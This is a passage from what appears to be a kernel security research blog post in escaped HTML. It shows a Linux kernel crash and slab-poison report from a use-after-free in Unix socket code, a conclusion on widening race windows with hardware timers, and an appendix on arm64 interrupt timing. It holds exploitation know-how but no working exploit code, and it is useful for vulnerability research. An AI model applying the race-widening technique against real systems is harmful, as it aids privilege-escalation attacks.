89&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;RSP: 0018:ffffb789027f7cf0 EFLAGS: 00010202&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;RAX: 6b6b6b6b6b6b6b6b RBX: ffff982d1d897b40 RCX: 0000000000000000&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;RDX: 6a0fe1820359dce8 RSI: ffffffffa81f9ba0 RDI: 0000000000000246&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;RBP: ffff982d1d897ea8 R08: 0000000000000000 R09: 0000000000000000&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;R10: 0000000000000000 R11: ffff982d2645c900 R12: ffffb789027f7dd0&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;R13: ffff982d1d897c10 R14: 0000000000000001 R15: ffff982d3390e000&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;FS: &amp;nbsp;00007f547209d740(0000) GS:ffff98309fa40000(0000) knlGS:0000000000000000&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;CS: &amp;nbsp;0010 DS: 0000 ES: 0000 CR0: 0000000080050033&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;CR2: 00007f54722cd000 CR3: 00000001b61f4002 CR4: 0000000000770ee0&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;PKRU: 55555554&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;Call Trace:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;[...]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;unix_stream_recvmsg+0x53/0x70&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;[...]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;__sys_recvfrom+0x166/0x180&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;[...]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;__x64_sys_recvfrom+0x25/0x30&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;do_syscall_64+0x33/0x80&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;entry_SYSCALL_64_after_hwframe+0x44/0xa9&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;[...]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;---[ end trace 39a81eb3a52e239c ]---&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;=============================================================================&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;BUG skbuff_head_cache (Tainted: G &amp;nbsp; &amp;nbsp; &amp;nbsp;D &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;): Poison overwritten&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;-----------------------------------------------------------------------------&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;INFO: 0x00000000d7142451-0x00000000d7142451 @offset=68. First byte 0x6c instead of 0x6b&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;INFO: Slab 0x000000002f95c13c objects=32 used=32 fp=0x0000000000000000 flags=0x17ffffc0010200&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;INFO: Object 0x00000000ef9c59c8 @offset=0 fp=0x00000000100a3918&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;Object &amp;nbsp; 00000000ef9c59c8: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &amp;nbsp;kkkkkkkkkkkkkkkk&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;Object &amp;nbsp; 0000000097454be8: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &amp;nbsp;kkkkkkkkkkkkkkkk&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;Object &amp;nbsp; 0000000035f1d791: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &amp;nbsp;kkkkkkkkkkkkkkkk&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;Object &amp;nbsp; 00000000af71b907: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &amp;nbsp;kkkkkkkkkkkkkkkk&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c4 c9\"&gt;Object &amp;nbsp; 000000000d2d371e: 6b 6b 6b 6b &lt;/span&gt;&lt;span class=\"c6 c18 c9 c25\"&gt;6c&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &amp;nbsp;kkkklkkkkkkkkkkk&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;Object &amp;nbsp; 0000000000744b35: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &amp;nbsp;kkkkkkkkkkkkkkkk&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;Object &amp;nbsp; 00000000794f2935: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &amp;nbsp;kkkkkkkkkkkkkkkk&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;Object &amp;nbsp; 000000006dc06746: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &amp;nbsp;kkkkkkkkkkkkkkkk&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;Object &amp;nbsp; 000000005fb18682: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &amp;nbsp;kkkkkkkkkkkkkkkk&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;Object &amp;nbsp; 0000000072eb8dd2: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &amp;nbsp;kkkkkkkkkkkkkkkk&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;Object &amp;nbsp; 00000000b5b572a9: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &amp;nbsp;kkkkkkkkkkkkkkkk&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;Object &amp;nbsp; 0000000085d6850b: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &amp;nbsp;kkkkkkkkkkkkkkkk&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;Object &amp;nbsp; 000000006346150b: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &amp;nbsp;kkkkkkkkkkkkkkkk&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;Object &amp;nbsp; 000000000ddd1ced: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b a5 &amp;nbsp;kkkkkkkkkkkkkkk.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;Padding &amp;nbsp;00000000e00889a7: 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a &amp;nbsp;ZZZZZZZZZZZZZZZZ&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;Padding &amp;nbsp;00000000d190015f: 5a 5a 5a 5a 5a 5a 5a 5a &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;ZZZZZZZZ&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;CPU: 7 PID: 1641 Comm: gnome-shell Tainted: G &amp;nbsp; &amp;nbsp;B D &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 5.10.0-9-amd64 #1 Debian 5.10.70-1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;[...]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;Call Trace:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;dump_stack+0x6b/0x83&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;check_bytes_and_report.cold+0x79/0x9a&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;check_object+0x217/0x260&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;[...]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;alloc_debug_processing+0xd5/0x130&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;___slab_alloc+0x511/0x570&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;[...]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;__slab_alloc+0x1c/0x30&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;kmem_cache_alloc_node+0x1f3/0x210&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;__alloc_skb+0x46/0x1f0&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;alloc_skb_with_frags+0x4d/0x1b0&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;sock_alloc_send_pskb+0x1f3/0x220&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;[...]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;unix_stream_sendmsg+0x268/0x4d0&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;sock_sendmsg+0x5e/0x60&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;____sys_sendmsg+0x22e/0x270&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;[...]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;___sys_sendmsg+0x75/0xb0&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;[...]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;__sys_sendmsg+0x59/0xa0&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;do_syscall_64+0x33/0x80&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;entry_SYSCALL_64_after_hwframe+0x44/0xa9&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;[...]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;FIX skbuff_head_cache: Restoring 0x00000000d7142451-0x00000000d7142451=0x6b&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;FIX skbuff_head_cache: Marking all objects used&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;RIP: 0010:unix_stream_read_generic+0x72b/0x870&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;Code: fe ff ff 31 ff e8 85 87 91 ff e9 a5 fe ff ff 45 01 77 44 8b 83 80 01 00 00 85 c0 0f 89 10 01 00 00 49 8b 47 38 48 85 c0 74 23 &amp;lt;0f&amp;gt; bf 00 66 85 c0 0f 85 20 01 00 00 4c 89 fe 48 8d 7c 24 58 44 89&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;RSP: 0018:ffffb789027f7cf0 EFLAGS: 00010202&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;RAX: 6b6b6b6b6b6b6b6b RBX: ffff982d1d897b40 RCX: 0000000000000000&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;RDX: 6a0fe1820359dce8 RSI: ffffffffa81f9ba0 RDI: 0000000000000246&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;RBP: ffff982d1d897ea8 R08: 0000000000000000 R09: 0000000000000000&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;R10: 0000000000000000 R11: ffff982d2645c900 R12: ffffb789027f7dd0&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;R13: ffff982d1d897c10 R14: 0000000000000001 R15: ffff982d3390e000&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;FS: &amp;nbsp;00007f547209d740(0000) GS:ffff98309fa40000(0000) knlGS:0000000000000000&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;CS: &amp;nbsp;0010 DS: 0000 ES: 0000 CR0: 0000000080050033&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;CR2: 00007f54722cd000 CR3: 00000001b61f4002 CR4: 0000000000770ee0&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c4 c9\"&gt;PKRU: 55555554&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"c15\" id=\"h.pjkt5u3x5bd1\"&gt;&lt;span&gt;Conclusion(s)&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;Hitting a race can become easier if, instead of racing two threads against each other, you race one thread against a hardware timer to create a gigantic timing window for the other thread. Hence the title! On the other hand, it introduces extra complexity because now you have to think about how timers actually work, and turns out, time is a complicated concept...&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;This shows how at least some really tight races can still be hit and &lt;/span&gt;&lt;span&gt;we should treat them&lt;/span&gt;&lt;span&gt;&amp;nbsp;as security bugs, even if it seems like they&amp;#39;d be very hard to hit at first glance.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;Also, precisely timing races is hard, and the details of how long it actually takes the CPU to get from one point to another are mysterious. (As not only exploit writers know, but also anyone who&amp;#39;s ever wanted to benchmark a performance-relevant change...)&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"c15\" id=\"h.adfta2d6xkv8\"&gt;&lt;span&gt;Appendix: How impatient are interrupts?&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;I did also play around with this stuff on arm64 a bit, and I was wondering: At what points do interrupts actually get delivered? Does an incoming interrupt force the CPU to drop everything immediately, or do inflight operations finish first? This gets particularly interesting on phones that contain two or three different types of CPUs mixed together.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;On a Pixel 4 (which has 4 slow in-order cores, 3 fast cores, and 1 faster core), I tried firing an interval timer at 100Hz (using &lt;/span&gt;&lt;span class=\"c4\"&gt;timer_create()&lt;/span&gt;&lt;span&gt;), with a signal handler that logs the &lt;/span&gt;&lt;span class=\"c4\"&gt;PC&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;register, while running this loop:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 400680:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000442 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x2, x2, #0x1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 400684:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000421 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x1, x1, #0x1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 400688:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;9ac20820 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;udiv&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x0, x1, x2&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 40068c:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91006800 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x0, x0, #0x1a&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 400690:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000400 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x0, x0, #0x1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 400694:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000442 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x2, x2, #0x1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 400698:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000421 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x1, x1, #0x1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 40069c:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000442 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x2, x2, #0x1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 4006a0:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000421 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x1, x1, #0x1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 4006a4:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;9ac20820 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;udiv&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x0, x1, x2&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 4006a8:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91006800 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x0, x0, #0x1a&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 4006ac:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000400 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x0, x0, #0x1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 4006b0:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000442 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x2, x2, #0x1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 4006b4:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000421 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x1, x1, #0x1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 4006b8:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000442 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x2, x2, #0x1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 4006bc:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000421 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x1, x1, #0x1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 4006c0:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;17fffff0 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;b&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;400680 &amp;lt;main+0xe0&amp;gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span 